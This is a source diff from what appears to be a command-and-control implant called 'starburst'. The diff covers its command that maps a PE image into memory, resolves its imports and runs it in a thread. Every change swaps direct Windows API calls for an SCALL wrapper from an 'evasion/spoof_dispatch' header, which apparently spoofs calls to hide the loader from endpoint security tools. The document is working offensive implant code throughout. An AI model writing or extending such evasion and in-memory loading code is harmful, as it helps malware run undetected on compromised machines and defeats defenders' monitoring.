@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_EXECUTE_BOFPE
 
@@ -561,10 +562,9 @@ auto declfn starburst::cmd_execute_bofpe(
 
     // Allocate memory for the PE image
     uint32_t image_size = nt->OptionalHeader.SizeOfImage;
-    auto image_base = static_cast<uint8_t*>(
-        inst.kernel32.VirtualAlloc(
+    auto image_base = (uint8_t*)(LPVOID)SCALL(inst, kernel32.VirtualAlloc,
             nullptr, image_size,
-            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) );
+            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
     if ( !image_base ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "VirtualAlloc failed for PE" ) ) );
@@ -650,8 +650,7 @@ auto declfn starburst::cmd_execute_bofpe(
 
             HMODULE h_mod = nullptr;
             if ( !is_beacon ) {
-                h_mod = reinterpret_cast<HMODULE>(
-                    inst.kernel32.LoadLibraryA( dll_name ) );
+                h_mod = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, dll_name );
                 if ( !h_mod ) {
                     DBG_PRINT( inst, "bofpe: failed to load %s\n", dll_name );
                     import_ok = false;
@@ -674,7 +673,7 @@ auto declfn starburst::cmd_execute_bofpe(
                     if ( is_beacon ) {
                         DBG_PRINT( inst, "bofpe: beacon ordinal %u unsupported\n", ordinal );
                     } else if ( h_mod ) {
-                        resolved = (void*)inst.kernel32.GetProcAddress(
+                        resolved = (void*)SCALL( inst, kernel32.GetProcAddress,
                             h_mod, (LPCSTR)(uintptr_t)ordinal );
                     }
                 } else {
@@ -687,7 +686,7 @@ auto declfn starburst::cmd_execute_bofpe(
                         DBG_PRINT( inst, "bofpe: beacon import '%s' -> %p\n",
                             func_name, resolved );
                     } else if ( h_mod ) {
-                        resolved = (void*)inst.kernel32.GetProcAddress(
+                        resolved = (void*)SCALL( inst, kernel32.GetProcAddress,
                             h_mod, func_name );
                     }
                 }
@@ -707,7 +706,7 @@ auto declfn starburst::cmd_execute_bofpe(
     }
 
     if ( !import_ok ) {
-        inst.kernel32.VirtualFree( image_base, 0, MEM_RELEASE );
+        SCALL( inst, kernel32.VirtualFree, image_base, 0, MEM_RELEASE );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "import resolution failed" ) ) );
         return;
@@ -737,7 +736,7 @@ auto declfn starburst::cmd_execute_bofpe(
 
         DWORD prot = section_protection( sections[i].Characteristics );
         DWORD old_prot;
-        inst.kernel32.VirtualProtect(
+        SCALL( inst, kernel32.VirtualProtect,
             image_base + sections[i].VirtualAddress,
             sec_size, prot, &old_prot );
     }
@@ -765,7 +764,7 @@ auto declfn starburst::cmd_execute_bofpe(
     }
 
     if ( !entry_ptr ) {
-        inst.kernel32.VirtualFree( image_base, 0, MEM_RELEASE );
+        SCALL( inst, kernel32.VirtualFree, image_base, 0, MEM_RELEASE );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "entry point not found in exports" ) ) );
         return;
@@ -806,25 +805,25 @@ auto declfn starburst::cmd_execute_bofpe(
     bofpe_run_ctx ctx = { entry_ptr,
         reinterpret_cast<char*>( args_data ), static_cast<int>( args_len ), &inst };
 
-    HANDLE h_thread = inst.kernel32.CreateThread(
+    HANDLE h_thread = (HANDLE)SCALL( inst, kernel32.CreateThread,
         nullptr, 0,
         reinterpret_cast<LPTHREAD_START_ROUTINE>( bofpe_thread_fn ),
         &ctx, 0, nullptr );
 
     if ( h_thread ) {
-        DWORD wait = inst.kernel32.WaitForSingleObject( h_thread, 120000 );
+        DWORD wait = (DWORD)SCALL( inst, kernel32.WaitForSingleObject, h_thread, 120000 );
         DWORD exit_code = 0;
-        inst.kernel32.GetExitCodeThread( h_thread, &exit_code );
+        SCALL( inst, kernel32.GetExitCodeThread, h_thread, &exit_code );
 
         if ( wait == WAIT_TIMEOUT ) {
-            inst.kernel32.TerminateThread( h_thread, 1 );
+            SCALL( inst, kernel32.TerminateThread, h_thread, 1 );
             DBG_PRINT( inst, "bofpe: timed out after 120s\n" );
         } else if ( exit_code == 0 ) {
             exec_ok = true;
         } else {
             DBG_PRINT( inst, "bofpe: crashed with 0x%08X\n", exit_code );
         }
-        inst.kernel32.CloseHandle( h_thread );
+        SCALL( inst, kernel32.CloseHandle, h_thread );
     } else {
         // Fallback: run in current thread
         instance* old_aup = bofpe_get_inst();
@@ -884,7 +883,7 @@ auto declfn starburst::cmd_execute_bofpe(
         }
     }
 
-    inst.kernel32.VirtualFree( image_base, 0, MEM_RELEASE );
+    SCALL( inst, kernel32.VirtualFree, image_base, 0, MEM_RELEASE );
 }
 
 #endif
